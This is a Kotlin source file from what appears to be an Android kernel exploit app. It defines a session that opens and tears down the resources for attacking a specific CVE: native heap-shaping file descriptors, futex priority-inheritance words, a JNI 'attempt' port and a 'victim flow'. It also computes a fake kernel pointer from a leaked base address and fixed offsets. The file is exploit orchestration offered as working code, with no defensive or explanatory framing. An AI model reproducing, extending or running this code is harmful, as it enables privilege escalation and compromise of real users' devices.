package com.ghostlock.app.backend.cve43499.ktstep.run

import com.ghostlock.app.engine.ktstep.FutexWordsResult
import com.ghostlock.app.engine.ktstep.KernelFutexWords
import com.ghostlock.app.engine.ktstep.KernelSyscalls
import com.ghostlock.app.engine.ktstep.KtStepOutcome
import com.ghostlock.app.engine.ktstep.KtStepPlan
import com.ghostlock.app.engine.ktstep.NativeAttemptPort
import com.ghostlock.app.engine.ktstep.NativeJniAttemptPort
import com.ghostlock.app.engine.ktstep.NativeKernelSyscalls
import com.ghostlock.app.engine.ktstep.NativePrepare43499Port
import com.ghostlock.app.engine.ktstep.NativePrepareParams
import com.ghostlock.app.engine.ktstep.NativePrepareResult
import com.ghostlock.app.engine.ktstep.SyscallResult

sealed interface ProductionSessionResult {
    data class Ok(val session: Cve43499ProductionSession) : ProductionSessionResult
    data class Failed(val reason: String) : ProductionSessionResult
}

/**
 * Owns the production 43499 resource set: syscalls, prepare, PI words, attempt port and victim flow.
 * Open is synchronous (prepare is synchronous); run is suspend; close is reverse-order and idempotent.
 */
class Cve43499ProductionSession private constructor(
    private val syscalls: KernelSyscalls,
    private val prepare: NativePrepare43499Port,
    val facts: NativePrepareResult.Ok,
    private val words: KernelFutexWords,
    private val attempt: NativeAttemptPort,
    private val flow: Cve43499ProductionFlow,
    private val routePort: Cve43499RoutePort? = null,
) : AutoCloseable {
    @Volatile private var closed = false

    suspend fun run(plan: KtStepPlan): KtStepOutcome = flow.run(plan)

    override fun close() {
        if (closed) return
        closed = true
        runCatching { routePort?.close() }
        runCatching { attempt.close() }
        runCatching { words.close() }
        runCatching { syscalls.close(facts.shapingFd) }
        runCatching { syscalls.close(facts.shapingPeerFd) }
        runCatching { prepare.close() }
    }

    companion object {
        fun open(
            params: NativePrepareParams,
            syscalls: KernelSyscalls = NativeKernelSyscalls(),
            prepare: NativePrepare43499Port = NativePrepare43499Port(),
            attempt: NativeAttemptPort = NativeJniAttemptPort(),
            routeConfig: Cve43499RouteConfig? = null,
        ): ProductionSessionResult {
            if (prepare.open() is SyscallResult.Errno) return ProductionSessionResult.Failed("prepare-open")
            val facts = when (val made = prepare.prepare(params)) {
                is NativePrepareResult.Ok -> made
                is NativePrepareResult.Errno -> { prepare.close(); return ProductionSessionResult.Failed("prepare:" + made.code) }
                is NativePrepareResult.Malformed -> { prepare.close(); return ProductionSessionResult.Failed("prepare-malformed:" + made.reason) }
            }
            if (facts.shapingFd < 0) { prepare.close(); return ProductionSessionResult.Failed("prepare:shaping-fd") }
            val words = when (val made = KernelFutexWords.create(syscalls, waitTimeoutNs = -1L)) {
                is FutexWordsResult.Ok -> made.words
                is FutexWordsResult.Errno -> { closeFacts(syscalls, prepare, facts); return ProductionSessionResult.Failed("words:" + made.code) }
            }
            if (attempt.open() is SyscallResult.Errno) {
                words.close()
                closeFacts(syscalls, prepare, facts)
                return ProductionSessionResult.Failed("attempt-open")
            }
            val routed = routeConfig?.takeIf { it.route != Cve43499RouteId.MulticastWaiter }
            val configured = if (routed is Cve43499RouteConfig.Select && routed.params.fakeRight == 0L) {
                Cve43499RouteConfig.Select(
                    routed.params.copy(fakeRight = (facts.base - 0xE80L) + 0x100L),
                )
            } else {
                routed
            }
            val port = configured?.let { Cve43499RouteFactory.create(it) }
            val flow = if (port != null) {
                Cve43499ProductionFlow.routed(port)
            } else {
                Cve43499ProductionFlow.production(facts, words, attempt)
            }
            return ProductionSessionResult.Ok(
                Cve43499ProductionSession(syscalls, prepare, facts, words, attempt, flow, port),
            )
        }

        private fun closeFacts(syscalls: KernelSyscalls, prepare: NativePrepare43499Port, facts: NativePrepareResult.Ok) {
            runCatching { syscalls.close(facts.shapingFd) }
            runCatching { syscalls.close(facts.shapingPeerFd) }
            runCatching { prepare.close() }
        }
    }
}
